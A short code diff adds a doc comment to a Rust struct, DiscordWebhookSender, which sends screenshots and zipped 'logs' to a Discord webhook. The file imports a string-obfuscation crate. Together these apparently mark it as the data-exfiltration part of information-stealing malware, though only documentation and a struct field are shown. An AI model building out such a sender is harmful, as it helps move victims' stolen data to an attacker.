@@ -9,6 +9,19 @@ use obfstr::obfstr as s;
 use requests::{write_file_field, write_text_field, BodyRequestBuilder, MultipartBuilder, Request, RequestBuilder};
 use utils::format_size;
 
+/// A log sender that transmits data to a Discord channel using a webhook.
+///
+/// `DiscordWebhookSender` uses Discord's webhook API to send embedded messages
+/// and files such as screenshots or zipped logs. It supports formatting logs
+/// with rich embeds and fallbacks for size constraints.
+///
+/// # Fields
+///
+/// - `webhook`: The full Discord webhook URL, including the webhook ID and token.
+///
+/// # Notes
+///
+/// - Discord has a file upload limit of 8 MB per file.
 #[derive(Clone, new)]
 pub struct DiscordWebhookSender {
     webhook: Arc<str>
